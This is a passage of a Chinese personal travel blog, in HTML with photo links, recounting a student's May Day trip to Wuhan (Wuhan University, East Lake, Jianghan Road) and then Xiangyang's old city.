title="充满艺术气息的椅子"></p><p>同学L奇怪的点是，为什么要在上面放木板椅子，我奇怪的点是，为什么要设计乘平行四边形的结构。最后，我们得出一个结论，<strong>这是艺术罢。</strong>然后走着走着，看到一个博物馆，当时很震惊，为什么学校里会有博物馆呀喂，一般最多就是什么校史馆吧喂！！！问了下同学Z，他说他也没进去过。我和同学L都很震惊，身为一个武大的学生，没进过自己学校的博物馆，多少有点荒谬了。然后我们就进去参观了，根据同学Z的说法，这个博物馆是校友捐了几个亿建的，进去之后，切实感受到了这个博物馆的豪华。从动物到植物，从人文到地理，从美术到艺术，各式各样的展品都出现在了这样一个“博物馆”中。很震惊，不愧是综合性大学呀！</p><p>各种动物标本，青铜器，陶器，甚至还有墓砖，当然也有近现代的物件，一些苏联美学的仪器，还有很多海大高攀不起的东西。这些还只是负一楼，上到二楼之后就是美术展了。本人不懂什么艺术，反正就是各种风格的画作，雕塑，物品，光影。我受到了不小的艺术熏陶（确认）。</p><p><img src="https://cdn.lmark.cc/img/image-20230510003753000.png" alt="image-20230510003753000" title="第一次见到长颈鹿和袋鼠标本"></p><p>然后出了博物馆就继续逛武大校园了。简单评价一下武大校园，一个字——<strong>有种上世纪末本世纪初的独特美感！</strong>最具标志性的特征就是蓝色钴玻璃。此外，还有那种看起来很想这个世纪初产物的大巴。凸显了武大浓厚的历史底蕴（编不下去了。。。）总之就是看的出来校区很旧，路上的路灯的风格也不像近些年的。走着走着，就走到了武大地标性建筑，武大的一个行政楼貌似。如下图所示：</p><p><img src="https://cdn.lmark.cc/img/image-20230510005440450.png" alt="image-20230510005440450" title="武汉大学校徽上的建筑，像一个宫殿一样"></p><p>我个人是挺喜欢这个屋顶的，这种天青色的陶瓦，看起来给人一种很舒服的感觉，很安心，虽然让我一下子联想起海底神殿就是了。。。</p><p><img src="https://cdn.lmark.cc/img/image-20230510010125914.png" alt="image-20230510010125914" title="数院，恍惚间有种在日本的感觉"></p><p>然后旁边这里有个操场，看起来也是比较古老了，有好多人在练习棒球，</p><p><img src="https://cdn.lmark.cc/img/image-20230510010243906.png" alt="image-20230510010243906" title="可恶，太现充了"></p><p>我们水专好像没有棒球课这个课，我也没听说有海大有打棒球的社团（可能是本人孤陋寡闻了），文体活动真实丰富呢，一整个羡慕住了，不过仔细想想，毕竟是综合性大学，可以理解。在路边稍事休息之后，我们缓步踱到了一个宿舍楼下。值得注意的是，同学L传的这身衣服太过好看和吸睛，导致路上的小朋友回头率百分百，好多个小朋友都直接叫她们妈妈给他们买，看来是给这些小朋友埋下了梦想的果实了。说罢，我们到了宿舍楼下，同学Z提议上去看看。</p><p><img src="https://cdn.lmark.cc/img/image-20230510011200003.png" alt="image-20230510011200003" title="某个网红景点?"></p><p>这个宿舍应该算是武大比较古老的宿舍了，可以看到这风格，emmmm，不好评价，感觉起来是空间利用率很高，而且这栋楼是女生宿舍！就很离谱，白天楼下一堆嬉闹游玩的游客，估计吵得午觉都谁不好吧。而且这个楼梯很陡很高，用同学Z的话说，<strong>从这里滚下去直接寄了！</strong>我们仨好不容易爬到顶，才发现，只是到了另一个层的一楼。人麻了，这武大建山上的吧！怎么来了大城市还是要爬山呀！！！话说爬到顶之后，相当于当了宿舍的楼顶了，可以从上面看到宿舍阳台，我和同学Z好奇的过去看了一眼，被震惊了，直接能看到女生宿舍的阳台，晾的衣服啥的都可以看到。瞬间尬住。然后我们仨开始批判起武大这个宿舍楼不合理之处：<strong>不仅吵，还没有隐私</strong>。下图是隔壁男生宿舍的阳台，不仔细看的话，感觉和我家乡的没装修过的房子风格差不多：</p><p><img src="https://cdn.lmark.cc/img/image-20230510013711845.png" alt="image-20230510013711845" title="有点low呀这宿舍"></p><p>参观完武大最古老的宿舍之后，我们选择走林荫小道。一路上，四周全都是高大的林木，繁茂的树叶，斑驳的阳光，婆娑的树影，一切的一切都存在于一条不够三人并排的小道上。我们仨一路上有说有笑，不停感慨武大这所综合性大学，突然，豁然开朗，眼前仿佛一片世外桃园般的景色映入眼帘，感觉像是探险家发现了失落的丛林遗迹般，那座天青色瓦顶的建筑就矗立在那，外墙上几扇红色的窗扉显得是格格不入.</p><p><img src="https://cdn.lmark.cc/img/image-20230510020935340.png" alt="image-20230510020935340" title="曲径通幽处"></p><p>每个大城市都有博物馆，里面展出的确实是很古老的文物，但是那些文物都已经死了，失去灵魂，空有其形，匮乏其气。而大学不一样了，很多上百年历史的建筑被改造成教学楼，进进出出，都是人气。即可远观，也可亵玩。武大学生每天活在活的历史里，想想就很有意思。（以上内容是半夜两点写的，整个人已经困得神志不清了）所以我来武汉第一天就来了武大。现在。说回我们仨，在这种崎岖不平的小路上同学L穿的六厘米高跟鞋就很难受，经常容易崴脚。</p><p>然后走了好久，终于走出了这片古建筑群，然后走到一篇现代建筑群，不愧是武大，还有近现代的建筑，还这么好看，不愧是综合性大学。然后同学Z说，武大后面有个叫<strong>凌波门</strong>的景点。同学Z和同学L说凌波门很危险，很窄，每年都有人掉下去。我当时不知道这个景点是干嘛的，所以听不懂他们在说什么。结果后面到了凌波门之后，我人都懵了，为什么会有这么一个景点？</p><p><img src="https://cdn.lmark.cc/img/image-20230512095638394.png" alt="image-20230512095638394" title="凌波门原来就是一个独木桥"></p><p>就是一个室外游泳池，上面路很窄，像一个独木桥一样的结构，我提议上去看看，然后我们三人就上去了，结果刚走出两步，同学L就害怕得跑了回去，没办法，现在只剩下我和同学Z，然后我们在门上坐了一会。这个凌波门下面水是很深的，听说每年都有人在这里remake，但是风景也是真的好，每天都会挤满人在这看日出，我本来也打算来这里看日出来着，但是太多人就不看了，后面我和同学Z在上面拍照，这还是很出片的，背景就是一望无际的水面，只不过我拍照的时候，后面有个大叔在换衣服，同学Z给我拍的每张照片都把他拍进去了，就挺难绷的。</p><p>我俩玩了好一会，才发现同学L的手机在我们身上，所以她刚刚就只能一直呆呆地坐在岸边了哈哈哈哈哈，有点好笑。逛完凌波门之后，也不知道去哪了，三个人犹豫了很久，最后我说去<strong>昙华林</strong>吧，遂开始打车。</p><p>这是我第一次来武汉做网约车&#x2F;出租车，一上车就感受到了司机的暴躁输出，先是嫌我们上车太慢来着，然后开始吐槽地图导航得不对，虽然我们都知道司机并没有恶意，但是武汉人的急性子也在他们的说话方式中体现出来了，很暴躁。哦对了，有个人因为戴着很高的头饰，上车撞到头了，我不说是谁，这只是她接下来一周多疯狂上车撞头的开始。司机人虽然是急性子，但是很实诚，给我们说了昙华林这个地方其实也就是个网红带出来的景点，属于本地人都不会去的那种，所以不推荐我们去，我们也只能笑笑。</p><p>到了昙华林之后，发现这里确实和司机说的一样，很多那种全国各地都能看到的同质化打卡点，比如KAWS公仔，还有很多花下长椅，不过整条街建筑风格都比较统一，属于那种民国风&#x2F;洋馆风。但是整体看着比较新，而且里面大部分都是商业化建筑，网红商店。昙华林在民国时期，确实是武汉的关键位置。但是经过现代的改造之后，感觉只是一条充斥了商业气息的网红文化街。我们仨走饿了，路过一家鲷鱼烧，就点了个充饥。味道还行吧，没吃过正宗的，勉强果腹。本来这条街就不是很大，结果五一还塞了这么多人，想喝个蜜雪都被人海给劝退了。逛完之后，我们仨感觉没什么意思，就打算再去逛逛户部巷，顺便找点吃的。在路上走着的时候，刚好赶上了学生放假来着，迎面走来很多穿校服的小孩，他们看到同学L的马面裙无一例外的被吸引了，就连马路对面的目光都被吸引了过来。泰裤辣！同学Z聊起一个事，说，武汉很多繁华的地段，总有很多老旧的小房子，里面也没人住，特别诡异。我倒是觉得很神奇，寸土寸金的闹市区，竟然空置这么多地皮，也是很神奇的了。</p><p><img src="https://cdn.lmark.cc/img/image-20230513002354607.png" alt="image-20230513002354607" title="一眼浦中校徽？"></p><p>到户部巷，看出来这里是一条网红小吃街，对于这种小吃街模式吧，我觉得很不能理解的地方就是我花钱来武汉旅游，难道是为了吃新疆炒米粉的嘛，咱就是说，<strong>网红美食show show way</strong>。然后我们仨逛了一圈，也没想到啥吃的，看了看时间，就打算去看个日落，看完之后再吃饭。然后就导航去了武汉江滩</p><p><img src="https://cdn.lmark.cc/img/image-20230513003332953.png" alt="image-20230513003332953" title="有一说一，起名是真随意"></p><p>进去之后随便找乐一个地坐下，开始静静看日落。仔细想想，这好像是我走了一天之后第一次坐下。</p><p>此时我们三个人都累的不行了，同学L更是，穿着六厘米的高跟鞋走了一天，脚已经疼的受不了了。我倒是还挺好的，第一天来武汉，感觉这个城市蛮不错的，近代风格+现代大都市，而且人流量还能接受，于是乎，我把武汉排在了<strong>我去过的这么多个城市排行榜的第二名</strong>。第一名由青岛保持着，短时间内估计没有人能打败它，然后第二名就是武汉。顺便一提，这个榜单目前只有两个城市。。。。。。通过闲聊得知，同学Z和同学L属实是宅了，武汉很多地方都没去过，仔细一想，我大一上的时候当时是疫情管制最松的时候吧，全国确诊才一千多来着，当时我就趁机逛了青岛很多地方，同时还有一段孽缘。而武汉属于是一直封控着，同学Z和同学L当时一个学期都不出几次校门，武汉还真是一个多灾多难的地方啊，仔细想想，我今天走过的街区，可能在两年前，就是新冠比较严重的地方。生、死、离、别这四个字在两年前，在这个地方，在很多人面前，改变着每个武汉人的人生轨迹（以上思考又是我半夜困得要死的时候写的，图一乐就好）。就这样，我们仨聊了很多，很多，很多，聊得太阳公公都看不下去了，直呼RNM退钱，开始躲入江中。海边城市的日落和中部城市的日落有点不太一样，在海边看日落，有一边是没有尽头的；在武汉看日落，远处的城市天际线就是尽头。这时候我才深刻意识到，原来我已经在武汉了，这个世界并不是楚门的世界。</p><p><img src="https://cdn.lmark.cc/img/image-20230514010209797.png" alt="image-20230513003552226" title="帅的"></p><p>日落的最后阶段很快，几乎是以肉眼可见的速度下落，待到太阳完全落下之后，远处的高楼开始了“灯光秀”。不过仔细一看，原来只是循环播放广告。反正我个人不太喜欢在高楼上打这么多灯。此时，我们三个人才发现，我们没有找吃饭的地，于是就开始找了起来。找了几家店，排队人超多，最后找到一家户部巷里的楚地三鲜。稍微排了一会队就吃上了。</p><p>所谓楚地三鲜，就是藕、牛杂和武昌鱼。不知是不是我们吃的这家做的不好，还是因为淡水鱼的缘故，我觉得这武昌鱼一般般，鱼刺倒是不少。甚至可能不如官垌草鱼（开玩笑）。武昌鱼这么火可能是因为那句诗吧。</p><p><strong>才饮长江水，又食武昌鱼。</strong></p><p>不过我还是喜欢刺少的海水鱼捏。</p><p>吃饭的时候，我把同学X叫来了，他从武理工一路坐地铁，风风火火跑到户部巷。其实最开始想的是多叫一个人可以多A一份钱（同学X不要打我）。这顿晚餐中，有一道米糊酒，一种想浆糊一样的，淡淡的酒，口感有点像史莱姆。结果没什么人吃。酒足饭饱之后，我们也该打道回府了。于是乎我们三个人开始打车了，不知道是不是因为我是外地人缘故，只有我打到了（异地特权yyds）。然后我们就上车了，没想到这一路上又有一堆J事。</p><p><img src="https://cdn.lmark.cc/img/image-20230514011821128.png" alt="image-20230514011821128" title="户部巷买的"></p><p>我们一开始打算，用一趟车，选一条可以经过我们所有人学校的路，然后一次放一个人下车。于是我一上车就和司机解释这件事，司机估计没听懂，喃喃了两句。于是就出发了，开了很久之后，我突然发现我没扎安全带（是的，已经开了快半个小时）。我就说为什么车里老是发出一个哔哔哔的声音，我还以为是车辆探测距离的雷达，原来是副驾没扎安全带的提示音啊！不过司机他自己也没发现，他要负99%的责任（甩锅）。于是乎，为了给司机减少损失（虽然已经路过很多个摄像头），在把同学Z送下车后，我灰溜溜地跑到后排去了。然后，司机告诉我们，打车软件上有一个叫途径点的功能，这样就可以把我们每个人送到校门口。不过此时同学Z已经下车了，他下车地点离他们学校门口有一个公里，他走回去估计腿又要废了，挺对不起他的，后面我们每个人都是直接到校门口了哈哈哈哈哈哈。</p><p>我跟着同学X回了武理工，拿了我今早寄存在他这的行李。然后就出发去我下榻的酒店了。emmmm，至于我下榻的酒店，哎，因为是五一，而且还是火车站附近（我也不知道为啥买火车站附近），而且预算不多，只能订到了一个，非常非常非常差的公寓，甚至这个公寓还是那种老旧校区里的房间改的。这个房间质量和我们高中宿舍差不多，总之就是非常垃圾。果然一分钱一分货啊。</p><p>不过好在是，有惊无险的度过了第一天晚上，除了被蚊子咬了几个包，隔音超差，很热之外。其他倒也正常，时间来到了第二天，武汉游的第二天。</p><h2 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h2><p>因为第一天同学L穿着六厘米高跟鞋走了一天，三万步。直接第二天脚疼得走不动了，然后同学Z说可以出来玩，只不过第二天也没见到他人就是了。最后我只能和同学X去逛东湖了。根据我在小红薯上看的攻略，东湖很大，如果要好好玩的话估计得玩一天。但是我没有这么多时间，所以只能挑几个地方。</p><p><img src="https://cdn.lmark.cc/img/image-20230514014533660.png" alt="image-20230514014533660" title="原来从武汉四号线可以去柏林呀"></p><p>出地铁之后，我和同学X就开始找共享单车了，因为这个景区很大，没有共享单车要走断腿。然后光速找到两辆单车，就出发了。我们先沿着绿道一路开，结果路上全是人，一大堆人，很多地方根本骑不动，五一不愧是五一，真的是<strong>人人人人人人你人人人人人人</strong>。好不容易开到里面人比较少的地方，马路上也还是有一堆人，整条路上大概是：<strong>人走车行道，车走人行道</strong>。不过有一说一，不愧是千湖之城的武汉，整个城市到处都是湖泊湿地。很适合休闲出行呀，东湖绿道环境非常好，路两旁绿树成荫，像原始森林般。</p><p><img src="https://cdn.lmark.cc/img/image-20230514015013170.png" alt="image-20230514015013170" title="环境优美"></p><p>虽然市区是扬沙气候，但是到了东湖这里就好了很多，远处的城市天际线感觉这里就像中央公园一样，世外桃源。</p><p><img src="https://cdn.lmark.cc/img/image-20230514015154054.png" alt="image-20230514015154054" title="远处是市区"></p><p>我们骑车骑累了，就停下来休息会，拍了会照片，不过同学X拍出来的很多<strong>照片都歪了，家人们，谁懂啊！</strong>再往深处骑，来到了一个热气球景点，可以坐热气球上去俯瞰东湖。旁边还有露营地，东湖这里好像是可以露营的，只要不过夜就行。旁边还有一个·动漫手办展，只需十块大洋！不过我没进去看就是了。</p><p><img src="https://cdn.lmark.cc/img/image-20230514015430977.png" alt="image-20230514015430977" title="要是绳子断了就免费了"></p><p>然后又骑了好久，到了东湖磨山景区，发现这里不能骑自行车上山，然后我们就还车了（后悔一天的决定）。弃车，腿之，走到一半才发现，我怎么来了武汉还是在爬山555。走到半山腰，发现缆车就在我们头顶，然后我们停下来喝水，我刚喝一口，看到天上有个缆车门敞开着，我直接笑喷了，不过是往上喷的，结果是喷了自己一身，不过，还是太好笑了，这个缆车是下行的，因为没有人，所以门是开着的，一旁的同学X很不解的看着我为什么自己喷自己。</p><p><img src="https://cdn.lmark.cc/img/image-20230520004217648.png" alt="image-20230520004217648" title="这个缆车其实挺低的"></p><p>又继续爬呀爬呀爬，在这小小的磨山里，爬呀爬呀爬。终于到山顶了。到了个叫朱碑亭的地方。这个朱碑亭据说是为了纪念朱德元帅修的，当年朱德元帅来东湖时，曾题过一句“东湖暂让西湖好，今后将比西湖强。”结果到现在，东湖有没有比西湖强，emmm，不好说，没去过西湖，有机会去西湖我一定好好比较比较。</p><p><img src="https://cdn.lmark.cc/img/image-20230520004819621.png" alt="image-20230520004819621" title="有一说一，上面风真大"></p><p>在亭上驻足许久，短暂歇息，听着旁边小孩看猫和老鼠时传出来的经典片头曲，才发现有些东西城里人和乡下人是一样的。稍微在旁边找了个小卖部坐了会，就向着我们磨山之行的目的地——滑道进发。</p><p>为什么是滑道呢？其实很大一个原因还是小红薯，上面把滑道描绘的很好玩，虽然我自己也觉得很好玩。毕竟是一个超级长长长的滑梯，哪个小孩和大人会不喜欢呢？</p><p>不过小红薯上很火的东西，在现实中只有两种情况：一种是以次充好的所谓网红景点，这种景点也只能依托于小红薯这种流量收割机才有可能火起来；另一种是真的好的景点，但是被过度宣传，导致人满为患，承受了这个景点不该承受的人流量。显然滑道属于后者。我们去到的时候，发现滑道排的队伍已经里里外外堆了114514层了，我和我同学直接被劝退，润了。我可不想排队两三个小时就为了一个这个滑道（其实还是很想玩的555）.</p><p><img src="https://cdn.lmark.cc/img/image-20230520004503049.png" alt="image-20230520004503049" title="可爱的修狗"></p><p>然后我们就找了条路下山了，虽然这条路非常陡峭，我们下山之后感觉膝盖都不是自己的了已经。此时，时间已经是下午一点半了，按照计划，也该去下一个地方了。然后开始找单车准备骑车出去，</p><p><img src="https://cdn.lmark.cc/img/image-20230520005944198.png" alt="image-20230520005944198"></p><p>结果是，在景区深处，根本找不到单车！！！打开地图，只有零零散散的几辆单车，走过去一看，要么是被人用锁锁起来了，要么是有人坐着，还有些是小孩拼命站着。没办法，我和同学X只能腿着先往外走，一路上看到好多人在草地上露营，在吊床上睡觉，还有人斗鸡（？）。但是这些都与我们无关，我们只想找两辆自行车，然后离开这里。</p><p>结果就是，走了超久，终于看到有一辆车，同学X眼疾手快，直接上去开了，然后我一个人又找了好久，最后终于也找到一辆，这个时候我们两个人已经要累死了。想着终于能悠闲地骑车出去了，结果，这将是我们今天噩梦的开始。。。。。。</p><p><img src="https://cdn.lmark.cc/img/image-20230520011513070.png" alt="image-20230520011513070" title="因为一个选择，我们直接进到了村里面"></p><p>我们从东湖左上角的大门进来的（红色路线），到中间玩了一圈之后，打算原路返回，结果到了一个分叉路口，我突发奇想，要不走没走过的地方吧（黑色路线），反正怎么走都能出去。就是这个决定，让我们差点没被困在村子里。我们先是骑单车，发现周围建筑越来越稀疏，路面情况越来越糟糕，然后直接到了泥路，然后我们看了看导航，最近的地铁站离我们超级远，所以我们只能坐公交车去最近的地铁站，上了公交之后，开了好多站，路上路过一个学院，很多人上车。这个感觉就像海带西海岸一样，位置偏僻，想去市区就得坐公交去地铁站。公交一路开，然后在一个地铁站附近到站了，但是我看地图附近并没有地铁站，就没有下车。实际上是因为我地图缩放有问题，并没有显示出来，然后公交车继续开，因为终点站是武汉站，所以路上车比较多，果不其然的，车最后就<strong>堵在了路上</strong>，此时时间也不早了，车上气氛很焦灼，我也开始后悔当时为什么要走这条路。</p><p><img src="https://cdn.lmark.cc/img/image-20230520015415833.png" alt="image-20230520015415833" title="大学生进村记"></p><p>这时有一个大哥，直接跟司机说在马路中间放我们下车，真的很感谢这个大哥，让我们没等死在马路上。我们光速下车，顶着大太阳，徒步走了一个多公里到了我们刚刚坐过头的公交车站，终于坐上了地铁。</p><p>坐上地铁，才让我感受到自己回到了城市，回到了现代社会。此时正值饭点，我和同学X也想不到有啥好吃的，就坐地铁去了家麦当劳去吃穷鬼套餐。</p><p><img src="https://cdn.lmark.cc/img/image-20230520013840185.png" alt="image-20230520013840185" title="这趟地铁的车头是玻璃的，可以看前方"></p><p>我们导航到的麦当劳，在汉口区某个大厦底下，走在路上，我发现了很多历史的痕迹，汉口在以前，应该就是武汉的老城区，就像城阳区之于青岛。路边梧桐参天，绿树成荫，还有比较旧的居民楼，走在这些地方，我才想起来，不久之前，两年前，这些地方可能是疫情的中心，在这些地方，每天都上演着生离死别，上演着让人热泪盈眶的故事。作为一个旅行者，我是切实感受到了疫情对这个城市造成多么深刻的影响，比如基本每辆网约车上都贴着“I Love 武汉”这是疫情期间帮忙运输物资的光荣证明，但是，这也无时无刻不在提醒着每个人，这是武汉，就是那个曾经疫情最严重的地方。</p><p><img src="https://cdn.lmark.cc/img/image-20230520014752532.png" alt="image-20230520014752532" title="招待所，时代的眼泪了"></p><p>可是，纵使这样，我在路边每个武汉人的脸上都看不到沮丧，看到的都是兴兴向荣。嗯，谁能想到，曾经来势汹汹的疫情，在去年的12月会突然消失呢。不知道那些曾经奋战在武汉一线的医护人员会怎么想。哈哈哈哈哈，都过去了，我们能做的只有铭记这段历史了。</p><p><img src="https://cdn.lmark.cc/img/image-20230520015014396.png" alt="image-20230520015014396" title="随处可见的抗疫标语"></p><p>走了没多久，就到了麦麦，我们分别点了穷鬼套餐和麦旋风，吃完了，坐那里休息了好久。还看了JK，</p><p><img src="https://cdn.lmark.cc/img/image-20230520015759278.png" alt="image-20230520015759278" title="记录生活"></p><p>本来是打算去古德寺看看，结果吃完晚饭之后时间也不早了，古德寺已经关门了，于是我们就转换目标，去黎黄坡路了。就像刚刚说的，噩梦才刚到一半，谁能想到五一会这么多人。。。</p><h2 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h2><p>距离上次写已经过去快两个月了，中间发生了很多事情，人都差点挂了，现在在胶东机场通宵，终于下定决心重新回来写一写，不能让我第一次远游烂尾。</p><p>吃完麦旋风之后，就去黎黄陂路了，我和同学X导航到了一个，轻轨站（？）这也是我第一次坐轻轨，外表上看起来和地铁基本没有区别，这倒解开了我之前一直不理解的问题：为什么武汉地铁不像青岛地铁一样，叫<strong>武汉地铁</strong>，而是<strong>武汉轨道交通</strong>，原来是还有一个轻轨。</p><p><img src="http://cdn.lmark.cc/img/image-20230708015017062.png" alt="image-20230708015017062" title="好多人的轻轨站"></p><p>轻轨给我的感觉和地铁是差不多的，但是速度慢一些，适合观光，不过为了降低噪音，两边的隔音板建的老高了。到地方之后，我们走了挺久，路上很明显的感受到，建筑的风格和年龄都老了不少。</p><p><img src="http://cdn.lmark.cc/img/image-20230708015446546.png" alt="image-20230708015446546" title="摄影是光与影的艺术"></p><p>有这么一栋楼，或者说一片楼（？）有点香港的感觉。</p><p><img src="http://cdn.lmark.cc/img/image-20230708015722622.png" alt="image-20230708015722622" title="不要问我为什么老是拍摄像头！"></p><p>老城区人流量明显比刚才KFC那里大，走着走着，遇到一个上海汽水包店。由于人太多，遂我俩没有尝试。</p><p><img src="http://cdn.lmark.cc/img/image-20230708020037245.png" alt="image-20230708020037245" title="和高密炉包有点像？"></p><p>无论如何，我俩总算是到了黎黄陂路，这是一条民国风洋房文化街区，整体建筑也比较出片，好看，嗯，，，想不出其他东西了哈哈哈哈哈，红色礼屋貌似是汪精卫住的地，下面放几张黎黄陂路的建筑吧，没有滤镜个人觉得很一般。</p><p><img src="http://cdn.lmark.cc/img/image-20230708020241630.png" alt="image-20230708020241630" title="打卡一下"></p><p><img src="http://cdn.lmark.cc/img/image-20230708020827845.png" alt="image-20230708020827845" title="占位符"></p><p><img src="http://cdn.lmark.cc/img/image-20230708020923823.png" alt="image-20230708020923823" title="占位符2"></p><p><img src="http://cdn.lmark.cc/img/image-20230708021033358.png" alt="image-20230708021033358" title="占位符3"></p><p>建筑本身是没问题的，就是商业化太严重，就像北海老街一样，可惜了。</p><p>草草逛完黎黄陂路之后，我俩思考了很久，本来想去江滩，但是突然发现我们在江的西边，看不到日落，所以去江滩好像没什么好看的，最后决定去江汉路看看。</p><p>很快啊，骑个共享单车，稍微飚了一下车就到了，然后在一个没有车停的路口停车（伏笔）。</p><p>江汉路人是真的多，真的繁华，哪哪都是人，整体来说类似于一个步行街吧。路两旁店铺超级多，种类也很丰富。</p><p><img src="http://cdn.lmark.cc/img/image-20230708040026061.png" alt="image-20230708040026061" title="中国银行"></p><p>在路边，我看到有三联书店，这名字是挺耳熟的，不知道为什么，也许是孤陋寡闻了，然后打算和同学X进去逛逛，进去之后，发现竟然有<strong>大冰的小屋</strong>，一下子勾起我尘封多年的记忆。当时第一次看大冰的书是在初中那会，不知道是谁的书，当时看的是<strong>《乖，摸摸头》</strong>，看完之后是给我幼小的心灵留下了深深的烙印，真的太神了，能够摆脱日常的枷锁，去也许不存在的远方，经历那么多不一样的事情，认识那么多神奇的人，看那么多惊艳的风景，大冰虽然是平铺直叙式叙事，但是讲出来的故事比许多精心设计的故事更加吸引人，这就是大冰的牛逼之处吧。仔细想想，我一个人出来旅行，有点受了大冰的启发呀。</p><p>之前公司（联合国六常）团建的时候，去桂林阳朔玩的时候，当时我也路过一家大冰的小屋，当时也没进去看，所以这一次，我一定要弥补曾经的遗憾……….个鬼咧，一进门，小姐姐就问我：您几位？我突然想起来，好像我没有马内欸，然后头也不回地离开了。果然，回忆还是留在脑海中最美好。</p><p><img src="http://cdn.lmark.cc/img/image-20230708040619407.png" alt="image-20230708040619407" title="这一整栋楼都是三联书店的"></p><p>三联书店我也逛了，不过相机当时充电，就没有拍照，果然，每次看到这种书店我就忍不住想进去看看，上次陪别人去书店好像是两年前，在青岛万达某个西西弗里，陪前前女友逛的。现在的实体书店确实比较卷，书籍内容丰富度已经达到了一个新的高度，甚至还有全套的<strong>高木同学台版</strong>。整体装修风格也很不错，特别是天花板全是镜子，营造出整个书店空间感非常大。店里当时还有个”屋顶音乐节“，只要消费到99元，就可以参加，我是有点好奇，但是行程比较赶，遂离开了三联书店。</p><p>出来之后天已经完全黑了，我看了一眼我们停车的地方，原本那里是空荡荡的，现在已经塞满了共享，路都被堵住了，我们好像干了什么不得了的事哈哈哈哈。随着天色彻底变暗，路上人流量暴涨，已经到了接踵摩肩的地步，我和同学X只能慢慢逛，路上看到不少竹筒奶茶和柠檬茶，不由得感慨有网红打卡属性的东西卖的这么好！</p><p><img src="http://cdn.lmark.cc/img/image-20230708043328156.png" alt="image-20230708043328156" title="夜市"></p><p>继续逛了逛，路上看到一家鲍师傅，就买了点海苔小贝当早餐吃，江汉路逛的差不多了，我们就慢慢来到了江滩这边，来打卡一下江汉关。然后我和同学X互相给对方拍照，但是同学X的技术堪忧，就这样，一边走一边玩，我们走到了江滩，意外的是，江边的马路上竟然有一侧车道完全没有车，还有一个作死女站马路中间拍照，真是离大谱。</p><p><img src="http://cdn.lmark.cc/img/image-20230708044146204.png" alt="image-20230708044146204" title="江汉关"></p><p>到了江边，能看到江对面的高楼灯光秀，昨天看了江左的，今天看江右的，感觉，比青岛的好看不少，不知为何。</p><p><img src="http://cdn.lmark.cc/img/image-20230708045307195.png" alt="image-20230708045307195"></p><p>超喜欢这张照片哈哈哈哈，贴出来，要是这两位能看到，也是很神奇了。</p><p><img src="http://cdn.lmark.cc/img/image-20230708045619890.png" alt="image-20230708045619890" title="喜欢是一起看灯火阑珊"></p><p>这个码头其实是走错了，江边有两个码头，这个是199的游轮的码头，所以人比较少，我们还能挤进来，但是隔壁的<strong>武汉关轮渡码头</strong>，被围得那叫一个水泄不通，码头里面是长长的S型队伍，外面人都已经排到马路上了，直接把一侧的车道全堵住了，现场状况可谓是恐怖。</p><p><img src="http://cdn.lmark.cc/img/image-20230709170402163.png" alt="image-20230709170402163" title="一块钱轮渡的码头"></p><p>看到这人山人海的夸张情形，我和同学X也就放弃了做轮渡回去，然后打算坐地铁回去，于是就回到了江汉路地铁站，此时江汉路地铁站也是人满为患，整个地铁站直接就封了，不给进了，因为人太多了啊啊啊，此时我和同学X已经走了很久，有些许累了，只想赶紧回去，于是我们想坐公交回去，于是又走了许久，来到了公交车站，但是公交车站附近的道路已经全部堵车，车十分钟都走不了一点，所以我们只能放弃坐公交回去，此时我们已经被困在江汉路快一个小时了，最后我们想到的办法是，走到江汉路地铁站的上一站坐地铁回去，事实证明，这是非常正确的选择。我们逆着人流走出了江汉路，但是路上还是有一大堆人，人挤人挤人。我们走着走着还走到一条两边摆满小摊的街道，中间走路的地方宽度不到两米，路上还是人挤人，我和同学X一路挤过去，这些摊位其实还是很有意思的，除了卖衣服的，还有很多娱乐的摊子，比如打气球，画画，塔罗牌，甚至还有摸水母去死皮的摊位。无论如何，好多小摊我还驻足看了许久，真的有意思。</p><p>最后挤呀挤，终于挤上了地铁，地铁站人多到已经不用刷卡进站了。和同学X在地铁上被挤的人都扁了，最后我们终于或者回到江右了，这一趟回来的行程愣是挤了两个小时才回到，回去之后，躺着缓了好久才恢复过来，人都被挤麻了。赶紧洗洗睡了，明天还要去襄阳呢。</p><h2 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h2><p>晚上睡的那一觉，竟然有文字，人被叮麻了，一个晚上没怎么睡好觉。不过我终于可以拜托那个超级垃圾的宾馆了哈哈。今天也是来武汉的第三天，今天在火车站附近吃了碗热干面，只要5块大洋，味道感觉一般般，但是价格只有5块呀。吃完我就去会和了。</p><p>武汉到襄阳高铁只要一个多小时，还是比较近的，于是我们就坐上了高铁，咻咻咻，然后就到襄阳了。</p><p><img src="http://cdn.lmark.cc/img/image-20230709181119727.png" alt="image-20230709181119727" title="不是智能动车"></p><p>到了之后，时间也到了中午了，打算去找东西吃，直接打车去一个面馆，结果到了之后发现没开门，五一黄金周竟然不开门，离大谱，只能慢慢走去襄阳古城看看有什么东西吃。</p><p><img src="http://cdn.lmark.cc/img/image-20230712115002950.png" alt="image-20230712115002950" title="一段若隐若现的古城墙"></p><p>襄阳古城在襄阳的中心，四周有护城河环绕，古城像一个孤岛一样，有几条桥连接起来。里边呈十字中心街放射状分布，四条街分别叫做：东街，西街，北街，南街。建筑风格是比较保守和偏旧的，可能是中午的缘故，路上没有很多人在走，路上经过一个公园，一位老爷爷还在打陀螺。</p><p><img src="http://cdn.lmark.cc/img/image-20230712115941851.png" alt="image-20230712115941851" title="老爷爷在打陀螺"></p><p>偶然路过一家烧饼店，3块钱这么大一块烧饼，而且还巨好吃。</p><p>终于，走了一路，走到古城最高城——北门，发现城墙是可以上去的，那这不得上去看看。</p><p><img src="http://cdn.lmark.cc/img/image-20230730231203364.png" alt="image-20230730231203364" title="北门锁錀？"></p><p>襄阳古城四周被护城河围绕，旁边有条江，视野开阔，风还很大。懒得解说了，放一堆图吧。富士原图只出，也懒得后期了，哈哈哈哈，主打一个懒。</p><p><img src="http://cdn.lmark.cc/img/image-20230730231740024.png" alt="image-20230730231740024" title="一个叫啥的亭子来着"></p><p><img src="http://cdn.lmark.cc/img/image-20230730231823255.png" alt="image-20230730231823255" title="城门回望"></p><p><img src="http://cdn.lmark.cc/img/image-20230730231952497.png" alt="image-20230730231952497" title="天"></p><p><img src="http://cdn.lmark.cc/img/image-20230730232014793.png" alt="image-20230730232014793" title="修狗"></p><p><img src="http://cdn.lmark.cc/img/image-20230730232038225.png" alt="image-20230730232038225" title="襄 阳 古 